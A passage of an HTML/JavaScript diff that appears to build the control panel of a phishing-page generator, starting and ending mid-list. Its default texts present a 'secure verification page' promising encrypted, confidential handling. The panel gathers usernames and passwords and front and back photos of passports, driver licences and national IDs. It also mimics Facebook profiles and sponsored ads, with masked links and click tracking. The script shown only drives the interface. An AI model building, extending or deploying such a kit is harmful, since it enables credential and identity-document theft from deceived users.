+<option value="style75">Badge Style</option>
+
+<option value="style76">Premium Gold Glow</option>
+<option value="style77">Diamond Shine</option>
+<option value="style78">Emerald Luxury</option>
+<option value="style79">Ruby Luxury</option>
+<option value="style80">Sapphire Luxury</option>
+
+<option value="style81">Instagram Gradient</option>
+<option value="style82">YouTube Red</option>
+<option value="style83">Facebook Blue</option>
+<option value="style84">TikTok Neon</option>
+<option value="style85">LinkedIn Blue</option>
+
+<option value="style86">Matte Black</option>
+<option value="style87">Soft Cream</option>
+<option value="style88">Cool Gray</option>
+<option value="style89">Warm Beige</option>
+<option value="style90">Snow White</option>
+
+<option value="style91">Animated Glow</option>
+<option value="style92">Animated Pulse</option>
+<option value="style93">Animated Wave</option>
+<option value="style94">Animated Flash</option>
+<option value="style95">Animated Shine</option>
+
+<option value="style96">Heavy Outline Glow</option>
+<option value="style97">Deep Neon Purple</option>
+<option value="style98">Electric Blue</option>
+<option value="style99">Cyber Red</option>
+<option value="style100">Ultimate Premium</option>
+
+</select>
+
+  <label>Title Animation</label>
+  <select id="titleAnimation">
+    <option value="none">None</option>
+    <option value="fade">Fade In</option>
+    <option value="slideUp">Slide Up</option>
+    <option value="slideDown">Slide Down</option>
+    <option value="slideLeft">Slide Left</option>
+    <option value="slideRight">Slide Right</option>
+    <option value="zoomIn">Zoom In</option>
+    <option value="zoomOut">Zoom Out</option>
+    <option value="rotate">Rotate</option>
+    <option value="flipX">Flip X</option>
+    <option value="flipY">Flip Y</option>
+    <option value="bounce">Bounce</option>
+    <option value="pulse">Pulse</option>
+    <option value="shake">Shake</option>
+    <option value="glow">Glow</option>
+    <option value="blurIn">Blur In</option>
+    <option value="typewriter">Typewriter</option>
+    <option value="wave">Wave</option>
+    <option value="float">Float</option>
+    <option value="heartbeat">Heartbeat</option>
+    <option value="neon">Neon</option>
+    <option value="swing">Swing</option>
+    <option value="rubberBand">Rubber Band</option>
+    <option value="fadeScale">Fade + Scale</option>
+    <option value="skew">Skew</option>
+    <option value="rotateIn">Rotate In</option>
+    <option value="dropIn">Drop In</option>
+    <option value="slideRotate">Slide + Rotate</option>
+    <option value="fadeLeft">Fade Left</option>
+    <option value="fadeRight">Fade Right</option>
+  </select>
+
+  <!-- 🎬 Collapsible Animation Panel -->
+<div style="margin-top:12px;">
+
+  <button type="button" id="toggleAnimationPanel"
+    style="
+      width:100%;
+      padding:8px;
+      border:none;
+      border-radius:6px;
+      background:#111;
+      color:#fff;
+      cursor:pointer;
+    ">
+    🎬 Show Animation Settings
+  </button>
+
+  <div id="animationPanel"
+    style="
+      display:none;
+      margin-top:10px;
+      padding:14px;
+      background:#f8f9fa;
+      border:1px solid #ddd;
+      border-radius:10px;
+    ">
+
+    <strong style="display:block;margin-bottom:10px;">
+      🎛 Animation Controls
+    </strong>
+
+    <!-- Speed Slider -->
+    <label>Animation Speed (<span id="speedValue">1</span>s)</label>
+    <input type="range" id="animationSpeed"
+           min="0.2" max="5" step="0.1" value="1"
+           style="width:100%;">
+
+    <!-- Delay Slider -->
+    <label style="margin-top:10px;">
+      Animation Delay (<span id="delayValue">0</span>s)
+    </label>
+    <input type="range" id="animationDelay"
+           min="0" max="5" step="0.1" value="0"
+           style="width:100%;">
+
+    <!-- Checkboxes -->
+    <label style="display:flex;align-items:center;gap:6px;margin-top:10px;">
+      <input type="checkbox" id="animationInfinite">
+      Infinite Loop
+    </label>
+
+    <label style="display:flex;align-items:center;gap:6px;">
+      <input type="checkbox" id="animationOnScroll">
+      Animate On Scroll
+    </label>
+
+    <!-- Mini Preview Player -->
+    <div style="
+        margin-top:15px;
+        padding:12px;
+        background:white;
+        border-radius:8px;
+        border:1px solid #ddd;
+        text-align:center;
+    ">
+      <div id="animationMiniPreview"
+           style="font-weight:600;">
+        Animation Preview
+      </div>
+
+      <button type="button"
+        id="replayAnimation"
+        style="
+          margin-top:10px;
+          padding:5px 12px;
+          border:none;
+          border-radius:6px;
+          background:#007bff;
+          color:white;
+          cursor:pointer;
+        ">
+        ▶ Replay
+      </button>
+    </div>
+
+  </div>
+</div>
+
+  <!-- Show/hide toggle button -->
+  <button id="toggleTitleStyles">🎛 Show Title Styles</button>
+
+  <!-- Style controls container -->
+  <div id="styleControls" style="display:none; margin-top:10px;">
+    <label>Font Size (px)</label>
+    <input type="range" id="titleSize" min="12" max="80" step="1">
+
+    <label>Width (%)</label>
+    <input type="range" id="titleWidth" min="50" max="80" step="1">
+
+    <label>Line Height</label>
+    <input type="range" id="titleHeight" min="0.8" max="2" step="0.05">
+
+    <label>Letter Spacing (px)</label>
+    <input type="range" id="titleSpacing" min="0" max="10" step="0.5">
+
+    <label>Shadow X</label>
+    <input type="range" id="shadowX" min="0" max="10">
+
+    <label>Shadow Y</label>
+    <input type="range" id="shadowY" min="0" max="10">
+
+    <label>Shadow Blur</label>
+    <input type="range" id="shadowBlur" min="0" max="10">
+  </div>
+</div>
+
+<!-- Live Title Preview -->
+<div class="preview-box">
+  <div id="titlePreview">Welcome to Your Secure Page</div>
+</div>
+
+<label>Subtitle</label>
+<input id="subtitle" value="Please fill in your details below">
+
+<label>Subtitle Color</label>
+<input type="color" id="subtitleColor">
+
+<label>Description</label>
+<textarea id="description">
+Welcome to our secure verification page. Please provide your details below to ensure your account remains safe. All information submitted is encrypted and handled confidentially.
+</textarea>
+</div>
+
+<!-- MEDIA -->
+<div class="section">
+  <h3>🎞 Media</h3>
+  <label>Gallery Images</label>
+  <textarea id="galleryImages"></textarea>
+
+<label>Gallery Layout</label>
+<select id="galleryLayout">
+  <option value="list">List</option>
+  <option value="grid">Grid</option>
+  <option value="large-grid">Large Grid</option>
+</select>
+
+  <h3>🖼 Gallery Items (Image + Masked Link)</h3>
+
+<label>Gallery Items Layout</label>
+<select id="galleryItemsLayout">
+  <option value="list">List</option>
+  <option value="grid">Grid</option>
+  <option value="large-grid">Large Grid</option>
+  <option value="mix">Mix List & Grid</option>
+</select>
+
+<div id="galleryItemsWrap"></div>
+
+<div class="btn-group">
+  <button class="btn-dark" onclick="addGalleryItem()">
+    ➕ Add Gallery Item
+  </button>
+
+  <button class="btn-outline" onclick="clearGalleryItems()">
+    🧹 Clear All Gallery Items
+  </button>
+</div>
+
+  <label>Videos</label>
+  <textarea id="videoLinks"></textarea>
+</div>
+
+<!-- ===============================
+🔗 EMBED & SOCIAL SYSTEM
+================================ -->
+
+<div class="embed-system-wrapper">
+
+  <!-- HEADER -->
+  <div class="embed-header">
+    <span>🔗 Embed & Social System</span>
+    <button onclick="toggleEmbedSystem(this)" class="toggle-btn">Hide</button>
+  </div>
+
+  <div id="embedSystemBody">
+
+    <!-- ===================================================== -->
+    <!-- 1️⃣ ENABLE SECTION -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <label>
+        <input type="checkbox" id="embedShow" checked>
+        Enable Section
+      </label>
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 2️⃣ EMBED CONTENT -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>📌 Embed Content</h4>
+
+      <label>Title</label>
+      <input id="embedText" placeholder="Embed title">
+
+      <label>Title Color</label>
+      <input type="color" id="embedTitleColor" value="#000000">
+
+      <label>Embed URL</label>
+      <input id="embedURL" placeholder="Paste embed URL">
+      <small>Supports YouTube, TikTok, Maps, Websites</small>
+
+      <label>Description</label>
+      <textarea id="embedDesc"></textarea>
+
+      <label>Override Social Preview Image</label>
+      <input id="socialPreviewImage">
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 3️⃣ CONTACT INFORMATION -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>📞 Phone</h4>
+      <input id="phoneMask" placeholder="Call us">
+      <input type="color" id="phoneColor" value="#000000">
+      <input id="phoneNumber" placeholder="+1234567890">
+
+      <hr>
+
+      <h4>✉ Email</h4>
+      <input id="emailMask" placeholder="Email us">
+      <input type="color" id="emailColor" value="#000000">
+      <input id="emailAddress" placeholder="example@email.com">
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 4️⃣ FACEBOOK PROFILE CUSTOMIZER -->
+    <!-- ===================================================== -->
+    <div id="facebookCustomWrapper" class="section">
+      <h4>👤 Facebook Profile Settings</h4>
+      
+      <label>
+  <input type="checkbox" id="includeFBProfile" checked>
+  Include Facebook Profile in Form
+</label>
+
+      <input id="fbName" value="John Doe">
+      <input id="fbLocation" value="New York, USA">
+      <input id="fbAge" type="number" value="32">
+
+      <select id="fbGender">
+        <option value="male">Male</option>
+        <option value="female">Female</option>
+      </select>
+
+      <select id="fbMarried">
+        <option value="single">Single</option>
+        <option value="married">Married</option>
+      </select>
+
+      <input id="fbJob" value="Software Engineer">
+
+      <label>Profile Picture</label>
+      <input type="file" id="fbProfilePic">
+
+      <label>Cover Picture</label>
+      <input type="file" id="fbCoverPic">
+
+      <label>
+        <input type="checkbox" id="fbVerified"> Verified Badge
+      </label>
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 5️⃣ FACEBOOK BIO & DETAILS -->
+    <!-- ===================================================== -->
+    <div class="section">
+  <h4>📝 Facebook Bio & Details</h4>
+
+  <textarea id="fbBio">I'm passionate about technology and creating innovative solutions. Always eager to learn new things and connect with like-minded people.</textarea>
+
+  <input id="fbRelationship" value="In a relationship">
+  
+  <input id="fbEducation" value="Bachelor of Science in Computer Science">
+  
+  <input id="fbWebsite" value="https://www.example.com">
+</div>
+
+    <!-- ===================================================== -->
+    <!-- 6️⃣ FACEBOOK EXTRA FEATURES -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>⚙ Extra Features</h4>
+
+      <label><input type="checkbox" id="fbDarkMode"> Dark Mode</label>
+      <label><input type="checkbox" id="fbMobileFrame"> Mobile Frame</label>
+      <label><input type="checkbox" id="fbEnableMessenger"> Messenger</label>
+      <label><input type="checkbox" id="fbEnableVideoAutoplay"> Video Autoplay</label>
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 7️⃣ SOCIAL MEDIA LINKS -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>🌐 Social Media Links</h4>
+
+      <label><input type="checkbox" id="socialNewTab" checked> Open in new tab</label>
+      <label><input type="checkbox" id="trackClicks"> Track Clicks</label>
+
+      <select id="socialPlatform" multiple size="6">
+        <option value="facebook">Facebook</option>
+        <option value="instagram">Instagram</option>
+        <option value="youtube">YouTube</option>
+      </select>
+
+      <input id="socialURL" placeholder="https://...">
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 8️⃣ FACEBOOK AD SETTINGS -->
+    <!-- ===================================================== -->
+    <div id="facebookAdFields" class="section" style="display:none;">
+  <h4>📢 Facebook Ad Settings</h4>
+
+  <label>Primary Text</label>
+  <textarea id="fbPrimaryText">
+🚀 Special Offer! Limited time discount available.
+Don’t miss out — act now!
+  </textarea>
+
+  <label>Headline</label>
+  <input id="fbHeadline" value="Get 50% Off Today">
+
+  <label>Description</label>
+  <input id="fbDescription" value="Limited seats available. Hurry!">
+
+  <h2>Call to Action Form</h2>
+
+    <!-- CTA Section -->
+    <label>Call To Action</label>
+    <select id="fbCTA">
+        <option value="learn_more">Learn More</option>
+        <option value="shop_now">Shop Now</option>
+        <option value="sign_up">Sign Up</option>
+        <option value="download">Download</option>
+        <option value="contact_us">Contact Us</option>
+        <option value="book_now">Book Now</option>
+        <option value="get_offer">Get Offer</option>
+        <option value="apply_now">Apply Now</option>
+        <option value="subscribe">Subscribe</option>
+        <option value="watch_now">Watch Now</option>
+        <option value="read_more">Read More</option>
+        <option value="explore_more">Explore More</option>
+        <option value="join_now">Join Now</option>
+        <option value="start_free_trial">Start Free Trial</option>
+        <option value="learn_more_about_us">Learn More About Us</option>
+        <option value="book_demo">Book a Demo</option>
+        <option value="get_started">Get Started</option>
+        <option value="request_info">Request Information</option>
+        <option value="see_pricing">See Pricing</option>
+    </select>
+
+    <!-- Dynamic Input Fields based on CTA Selection -->
+    <div id="ctaCustomFields" style="display:none;">
+        <!-- Sign Up Custom Input -->
+        <div id="signUpInput" style="display:none;">
+            <label for="signUpLink">Sign Up URL</label>
+            <input type="text" id="signUpLink" placeholder="Enter custom Sign Up URL">
+        </div>
+        
+        <!-- Download Custom Input -->
+        <div id="downloadInput" style="display:none;">
+            <label for="downloadLink">Download URL</label>
+            <input type="text" id="downloadLink" placeholder="Enter custom Download URL">
+        </div>
+        
+        <!-- Contact Us Custom Input -->
+        <div id="contactUsInput" style="display:none;">
+            <label for="contactUsLink">Contact Us URL</label>
+            <input type="text" id="contactUsLink" placeholder="Enter custom Contact Us URL">
+        </div>
+    </div>
+
+  <hr>
+
+  <h5>🎨 Advanced Ad Controls</h5>
+
+  <label>Ad Background Color</label>
+  <input type="color" id="fbAdBgColor" value="#ffffff">
+
+  <label>Text Color</label>
+  <input type="color" id="fbAdTextColor" value="#000000">
+
+  <label>
+    <input type="checkbox" id="fbSponsoredTag" checked>
+    Show Sponsored Label
+  </label>
+
+  <label>
+    <input type="checkbox" id="fbShowCTAButton" checked>
+    Show CTA Button
+  </label>
+
+  <label>Custom Badge Text (Optional)</label>
+  <input id="fbCustomBadge" placeholder="Limited Offer">
+
+  <hr>
+
+  <!-- Here is the updated section for uploading images -->
+  <label>Upload Ad Image</label>
+<input type="file" id="fbAdImage" accept="image/*">
+
+<img id="fbAdPreview"
+style="display:none;width:100%;margin-top:10px;border-radius:8px;">
+
+<label>Upload Social Preview Image</label>
+<input type="file" id="fbSocialPreviewImage" accept="image/*">
+
+<img id="fbSocialPreview"
+style="display:none;width:100%;margin-top:10px;border-radius:8px;">
+</div>
+
+    <!-- ===================================================== -->
+    <!-- 9️⃣ SOCIAL STYLE CONTROLS -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>🎨 Social Style Controls</h4>
+
+      <select id="socialLayout">
+        <option value="stack">Stack</option>
+        <option value="row">Row</option>
+        <option value="grid">Grid</option>
+      </select>
+
+      <input type="color" id="socialBgColor">
+      <input type="color" id="socialTextColor">
+      <input type="range" id="socialPadding">
+      <input type="range" id="socialGap">
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 🔟 PREVIEWS -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <h4>👁 Facebook Admin Mini Preview</h4>
+
+      <label>
+        <input type="checkbox" id="fbPreviewToggle" checked>
+        Show Preview
+      </label>
+
+      <div id="facebookAdminMiniPreview"></div>
+    </div>
+
+    <div class="section">
+      <h4>👁 Main Live Preview</h4>
+      <div id="adminLivePreview"></div>
+    </div>
+
+    <!-- ===================================================== -->
+    <!-- 1️⃣1️⃣ ACTION BUTTONS -->
+    <!-- ===================================================== -->
+    <div class="section">
+      <button id="addEmbedBtn">➕ Add Embed</button>
+      <button onclick="clearEmbedBlocks()">🧹 Clear All</button>
+    </div>
+
+  </div>
+</div> <!-- end embed-system-wrapper -->
+
+<script>
+/* =====================================================
+   🔗 EMBED & SOCIAL SYSTEM – CLEAN (STATE MIGRATED)
+   ===================================================== */
+
+document.addEventListener("DOMContentLoaded", function () {
+
+  const $ = id => document.getElementById(id);
+
+  const previewBox = $("adminLivePreview");
+  const fbMiniPreview = $("facebookAdminMiniPreview");
+
+  if (!previewBox) console.error("adminLivePreview not found");
+  if (!fbMiniPreview) console.error("facebookAdminMiniPreview not found");
+
+  /* ==========================================
+     TOGGLE SYSTEM
+  ========================================== */
+
+  window.toggleEmbedSystem = function (btn) {
+    const body = $("embedSystemBody");
+    if (!body) return;
+
+    const isHidden = body.style.display === "none";
+    body.style.display = isHidden ? "block" : "none";
+    btn.textContent = isHidden ? "Hide" : "Show";
+  };
+
+  /* ==========================================
+     SAFE EVENT LISTENERS (NO RENDER CALLS)
+  ========================================== */
+
+  function safeListen(id, event, callback) {
+    const el = $(id);
+    if (el) el.addEventListener(event, callback);
+  }
+
+  safeListen("socialPlatform", "change", function () {
+    const selected = Array.from(this.selectedOptions).map(o => o.value);
+    const adFields = $("facebookAdFields");
+    if (adFields) {
+      adFields.style.display =
+        selected.includes("facebook") ? "block" : "none";
+    }
+  });
+
+  safeListen("logoType", "change", function () {
+    const label = $("customLogoLabel");
+    const file = $("customLogoFile");
+
+    if (this.value === "custom") {
+      if (label) label.style.display = "block";
+      if (file) file.style.display = "block";
+    } else {
+      if (label) label.style.display = "none";
+      if (file) file.style.display = "none";
+    }
+  });
+
+  safeListen("customLogoFile", "change", function () {
+    const preview = $("customLogoPreview");
+    if (!this.files[0] || !preview) return;
+
+    const reader = new FileReader();
+    reader.onload = e => {
+      preview.src = e.target.result;
+      preview.style.display = "block";
+    };
+    reader.readAsDataURL(this.files[0]);
+  });
+  
+  // ===============================
+// 👤 FACEBOOK INPUT LISTENERS
+// ===============================
+const fbInputs = [
+  "fbName", "fbLocation", "fbAge", "fbGender",
+  "fbMarried", "fbJob", "fbBio", "fbRelationship",
+  "fbEducation", "fbWebsite", "fbDarkMode",
+  "fbMobileFrame", "fbEnableMessenger",
+  "fbEnableVideoAutoplay", "fbVerified"
+];
+
+fbInputs.forEach(id => {
+  const el = document.getElementById(id);
+  if (!el) return;
+
+  el.addEventListener("input", renderPreview);
+  el.addEventListener("change", renderPreview);
+});
+
+  /* ==========================================
+     CLEAR BUTTON (SAFE)
+  ========================================== */
+
+  window.clearEmbedBlocks = function () {
+    if (previewBox) {
+      previewBox.innerHTML =
+        '<p style="opacity:.6">Admin preview cleared...</p>';
+    }
+  };
+
+});
+</script>
+
+<!-- FORM -->
+<div class="section">
+  <h3>Form Fields</h3>
+
+  <!-- ✅ FORM TITLE INPUT (PUT HERE) -->
+  <label>Form Title (Optional)</label>
+  <input type="text" id="formTitleInput" placeholder="Enter form title">
+  
+  <label>Form Title Position</label>
+<select id="formTitlePosition">
+  <option value="left">Left</option>
+  <option value="center" selected>Center</option>
+  <option value="right">Right</option>
+</select>
+
+  <label>Form Title Color</label>
+  <input type="color" id="formTitleColor" value="#000000">
+
+  <label>
+    <input type="checkbox" id="addAuth" checked>
+    Include Username & Password
+  </label>
+
+  <input id="usernamePlaceholder" value="Email / Username">
+  <input id="passwordPlaceholder" value="Password">
+  
+  <hr>
+
+<label>
+  <input type="checkbox" id="enablePasswordToggle" checked>
+  Enable Show/Hide Password Icon 👁
+</label>
+
+<label>Eye Icon Style</label>
+<select id="eyeIconStyle">
+  <option value="none">None</option>
+  <option value="emoji">👁 Emoji</option>
+  <option value="text">Show/Hide Text</option>
+  <option value="classic">👁 / 🙈 Classic</option>
+</select>
+  
+  <hr>
+
+<h4>🎨 Input Style Controls</h4>
+
+<label>Input Background Color</label>
+<input type="color" id="inputBgColor" value="#ffffff">
+
+<label>Input Text Color</label>
+<input type="color" id="inputTextColor" value="#000000">
+
+<label>Border Color</label>
+<input type="color" id="inputBorderColor" value="#cccccc">
+
+<label>Input Size</label>
+<select id="inputSize">
+  <option value="sm">Small</option>
+  <option value="md" selected>Medium</option>
+  <option value="lg">Large</option>
+</select>
+
+<label>Input Shape</label>
+<select id="inputShape">
+  <option value="square">Square</option>
+  <option value="rounded">Rounded</option>
+  <option value="pill">Pill</option>
+  <option value="soft">Soft Rounded</option>        <!-- NEW -->
+  <option value="sharp">Sharp</option>              <!-- NEW -->
+  <option value="bubble">Bubble</option>            <!-- NEW -->
+</select>
+
+ <!-- ✅ ADD HERE -->
+  <label>Custom Radius (px)</label>
+  <input id="customRadius" placeholder="e.g. 15">
+
+  <label>Extra Fields</label>
+  <textarea id="extraFields"></textarea>
+
+  <div id="customFieldsWrap"></div>
+  <button class="btn-primary" onclick="addCustomField()">➕ Add Custom Field</button>
+<button class="btn-danger" onclick="clearCustomFields()">🗑 Clear Custom Fields</button>
+</div>
+
+<!-- =========================
+   🪪 ID UPLOAD (FULL SECTION)
+========================= -->
+<div class="section">
+  <h3>ID Upload</h3>
+
+  <!-- Enable Front / Back Individually -->
+  <label>
+    <label class="checkbox">
+  <input type="checkbox" id="chkIdFront">
+  <span></span>
+  Front ID
+</label>
+
+  <label>
+    <label class="checkbox">
+  <input type="checkbox" id="chkIdBack">
+  <span></span>
+  Back ID
+</label>
+  
+  <!-- FRONT ID -->
+<label>Front Example Image (Admin)</label>
+<input type="file" id="idFrontExample" accept="image/*">
+
+<label>User Upload (Front ID)</label>
+<input type="file" id="idFrontFile" accept="image/*">
+
+<img id="frontPreview" style="width:100%;max-width:300px;margin-top:10px;display:none;border-radius:8px;">
+
+<label>Preview Image Size (px)</label>
+<input type="range" id="idPreviewSize" min="80" max="300" value="140">
+
+<!-- BACK ID -->
+<label>Back Example Image (Admin)</label>
+<input type="file" id="idBackExample" accept="image/*">
+
+<label>User Upload (Back ID)</label>
+<input type="file" id="idBackFile" accept="image/*">
+
+<img id="backPreview" style="width:100%;max-width:300px;margin-top:10px;display:none;border-radius:8px;">
+
+  <input type="hidden" id="idExampleFront">
+  <input type="hidden" id="idExampleBack">
+
+  <hr style="margin:12px 0">
+
+  <!-- Global Title -->
+  <label>Custom Title (Optional)</label>
+  <input id="idUploadTitle" placeholder="Upload Your ID">
+  
+  <label>Custom Title Position</label>
+<select id="idTitlePosition">
+  <option value="none">None</option>
+  <option value="left">Left</option>
+  <option value="center">Center</option>
+  <option value="right">Right</option>
+</select>
+
+  <label>Title Color</label>
+  <input type="color" id="idTitleColor">
+
+  <!-- Global Description -->
+  <label>Description (Optional)</label>
+  <textarea id="idUploadDesc" placeholder="Write instructions here..."></textarea>
+
+  <label>Description Color</label>
+  <input type="color" id="idDescColor">
+
+  <!-- Background -->
+  <label>Background Color</label>
+  <input type="color" id="idBgColor">
+
+  <!-- Layout -->
+  <label>Layout</label>
+
+<div class="select-wrap">
+  <select id="idLayout">
+    <option value="">None (Default)</option>
+    <option value="column">Stacked</option>
+    <option value="side">Side by Side</option>
+  </select>
+</div>
+
+  <!-- Border Radius -->
+  <label>Border Radius</label>
+  <select id="idRadius"></select>
+
+  <hr style="margin:16px 0">
+
+  <!-- FRONT SETTINGS -->
+  <h4>Front ID Settings</h4>
+
+  <label>Front Small Title</label>
+  <input id="idFrontSmallTitle" placeholder="Front Side">
+
+  <label>Front Description</label>
+  <input id="idFrontDesc" placeholder="Upload clear front image">
+
+  <select id="idFrontType">
+  <option value="">None (Any file)</option>
+  <option value="image/*">JPG / PNG</option>
+  <option value="image/jpeg">JPEG</option>
+  <option value="image/png">PNG</option>
+  <option value="image/webp">WEBP</option>
+  <option value="application/pdf">PDF</option>
+  <option value="image/*,application/pdf">Image or PDF</option>
+  <option value="passport">Passport</option>
+  <option value="driver">Driver License</option>
+  <option value="national">National ID</option>
+  <option value="student">Student ID</option>
+  <option value="voter">Voter Card</option>
+</select>
+
+  <hr style="margin:16px 0">
+
+  <!-- BACK SETTINGS -->
+  <h4>Back ID Settings</h4>
+
+  <label>Back Small Title</label>
+  <input id="idBackSmallTitle" placeholder="Back Side">
+
+  <label>Back Description</label>
+  <input id="idBackDesc" placeholder="Upload clear back image">
+
+  <select id="idBackType">
+  <option value="">None (Any file)</option>
+  <option value="image/*">JPG / PNG</option>
+  <option value="image/jpeg">JPEG</option>
+  <option value="image/png">PNG</option>
+  <option value="image/webp">WEBP</option>
+  <option value="application/pdf">PDF</option>
+  <option value="image/*,application/pdf">Image or PDF</option>
+  <option value="passport">Passport</option>
+  <option value="driver">Driver License</option>
+  <option value="national">National ID</option>
+  <option value="student">Student ID</option>
+  <option value="voter">Voter Card</option>
+</select>
+</div>
+
+<!-- Auto-fill Border Radius 0–30 -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const radiusSelect = document.getElementById("idRadius");
+  if (radiusSelect && radiusSelect.options.length === 0) {
+
+    // None option
+    const noneOpt = document.createElement("option");
+    noneOpt.value = "";
+    noneOpt.textContent = "None";
+    radiusSelect.appendChild(noneOpt);
+
+    for (let i = 0; i <= 30; i++) {
+      const opt = document.createElement("option");
+      opt.value = i;
+      opt.textContent = i + "px";
+      radiusSelect.appendChild(opt);
+    }
+
+    radiusSelect.value = "";
+  }
+});
+</script>
+
+<!-- WARNING -->
+<div class="section">
+  <h3>⚠️ Warning</h3>
+  <label><input type="checkbox" id="enableWarning" checked> Show Warning</label>
+  <textarea id="warning">
+⚠️ Warning: Do not share your credentials with anyone. This page is for authorized users only.
+</textarea>
+
+  <label>Position</label>
+  <select id="warningPosition">
+    <option value="none">None</option>
+    <option value="normal">Normal</option>
+    <option value="left">Left</option>
+    <option value="center">Center</option>
+    <option value="right">Right</option>
+  </select>
+  
+  <label>
+  Warning Color
+  <input type="color" id="warningColor" value="#b71c1c">
+</label>
+</div>
+
+<!-- STYLING -->
+<div class="section">
+  <h3>🎨 Styling & Background</h3>
+
+  <label>Text Color</label>
+  <input type="color" id="textColor" value="#222222">
+
+  <label>Background Color</label>
+  <input type="color" id="bgColor" value="#ffffff">
+
+  <label>Background Image URL</label>
+  <input id="bgImageURL" placeholder="https://example.com/bg.jpg">
+  <label>Upload Background Image</label>
+<input type="file" id="bgImageFile" accept="image/*">
+
+  <label>Background Video URL (autoplay)</label>
+<input id="bgVideoURL" placeholder="https://example.com/video.mp4">
+
+  <label>Background Size</label>
+  <select id="bgSize">
+    <option value="cover">Cover</option>
+    <option value="contain">Contain</option>
+  </select>
+</div>
+
+<!-- BUTTONS -->
+<div class="section">
+  <h3>Buttons</h3>
+
+  <label>
+    <input type="checkbox" id="showGenerateBtn" checked>
+    Show Generate Button
+  </label>
+
+  <label>Generate Button Text</label>
+  <input id="generateBtnText" value="Generate">
+
+  <hr style="margin:15px 0;">
+
+  <label>
+    <input type="checkbox" id="showMainBtn" checked>
+    Show Main Button
+  </label>
+
+  <label>Main Button Text</label>
+  <input id="buttonText" value="Submit">
+
+  <label>Main Button Position</label>
+  <select id="btnPosition">
+    <option value="none">None</option>
+    <option value="center">Center</option>
+    <option value="left">Left</option>
+    <option value="right">Right</option>
+  </select>
+
+  <label>Button Color</label>
+  <input type="color" id="btnColor" value="#1976d2">
+  
+  <label>Button Animations (100+)</label>
+  <select id="btnAnimationEffect" multiple size="10"></select>
+  
+  <label>Button Icon Picker</label>
+  <input type="text" id="iconSearch" placeholder="Search site, card, emoji...">
+  
+  <label>Icon Size</label>
+  <input type="range" id="iconSize" min="14" max="40" value="18">
+
+  <select id="iconCategory">
+  <option value="all">All</option>
+  <option value="social">Social</option>
+  <option value="payment">Payment</option>
+  <option value="cards">Support Cards</option>
+  <option value="emoji">Emojis</option>
+</select>
+
+<select id="iconPicker" size="10"></select>
+  
+  <label>Ultra Button Effects</label>
+  <select id="btnUltraEffect">
+  <option value="none">None</option>
+
+  <!-- Core Effects -->
+  <option value="gradient-border">Animated Border</option>
+  <option value="glow-pulse">Glow Pulse</option>
+  <option value="press-3d">3D Press</option>
+  <option value="ripple">Ripple Click</option>
+
+  <!-- Glow Variations -->
+  <option value="glow-blue">Glow Blue</option>
+  <option value="glow-red">Glow Red</option>
+  <option value="glow-green">Glow Green</option>
+  <option value="rainbow-glow">Rainbow Glow</option>
+  <option value="cyber-glow">Cyber Glow</option>
+  <option value="fire-glow">Fire Glow</option>
+  <option value="ice-glow">Ice Glow</option>
+
+  <!-- Shadow Effects -->
+  <option value="soft-shadow">Soft Shadow</option>
+  <option value="hard-shadow">Hard Shadow</option>
+  <option value="shadow-left">Shadow Left</option>
+  <option value="shadow-right">Shadow Right</option>
+  <option value="shadow-top">Shadow Top</option>
+  <option value="shadow-bottom">Shadow Bottom</option>
+  <option value="floating">Floating Shadow</option>
+  <option value="inner-glow">Inner Glow</option>
+
+  <!-- Border Styles -->
+  <option value="double-border">Double Border</option>
+  <option value="thick-border">Thick Border</option>
+  <option value="outline">Outline</option>
+  <option value="ghost">Ghost Style</option>
+  <option value="gradient-border">Gradient Border</option>
+
+  <!-- Hover Animations -->
+  <option value="scale-hover">Scale Hover</option>
+  <option value="spin-hover">Spin Hover</option>
+  <option value="bounce-hover">Bounce Hover</option>
+  <option value="shake-hover">Shake Hover</option>
+  <option value="flash-hover">Flash Hover</option>
+
+  <!-- 3D / Special -->
+  <option value="neumorphic">Neumorphic</option>
+  <option value="glass">Glass Effect</option>
+  <option value="neon">Neon</option>
+  <option value="outer-ring">Outer Ring</option>
+  <option value="pulse-ring">Pulse Ring</option>
+  <option value="double-ring">Double Ring</option>
+
+  <!-- Shape + Transform FX -->
+  <option value="skew">Skew Effect</option>
+  <option value="parallelogram">Parallelogram</option>
+  <option value="diamond">Diamond</option>
+  <option value="blob">Blob Shape</option>
+  <option value="cut-corner">Cut Corner</option>
+
+  <!-- Animated Styles -->
+  <option value="wave-border">Wave Border</option>
+  <option value="animated-glow">Animated Glow</option>
+  <option value="border-animate">Border Animate</option>
+  <option value="lift-hover">Lift Hover</option>
+  <option value="3d-press">3D Press Classic</option>
+
+  <!-- Extra Premium -->
+  <option value="cyber-pulse">Cyber Pulse</option>
+  <option value="electric-border">Electric Border</option>
+  <option value="luxury-glow">Luxury Glow</option>
+  <option value="metallic-shine">Metallic Shine</option>
+  <option value="ultra-premium">Ultra Premium</option>
+</select>
+  
+  <label>Button Surround Effect</label>
+<select id="btnEffect">
+  <option value="none">None</option>
+  <option value="glow-blue">Glow Blue</option>
+  <option value="glow-red">Glow Red</option>
+  <option value="glow-green">Glow Green</option>
+  <option value="neon">Neon</option>
+  <option value="soft-shadow">Soft Shadow</option>
+  <option value="hard-shadow">Hard Shadow</option>
+  <option value="pulse-ring">Pulse Ring</option>
+  <option value="double-ring">Double Ring</option>
+  <option value="outer-ring">Outer Ring</option>
+  <option value="inner-glow">Inner Glow</option>
+  <option value="floating">Floating</option>
+  <option value="lift-hover">Lift Hover</option>
+  <option value="3d-press">3D Press</option>
+  <option value="glass">Glass Effect</option>
+  <option value="border-animate">Animated Border</option>
+  <option value="gradient-border">Gradient Border</option>
+  <option value="rainbow-glow">Rainbow Glow</option>
+  <option value="cyber-glow">Cyber Glow</option>
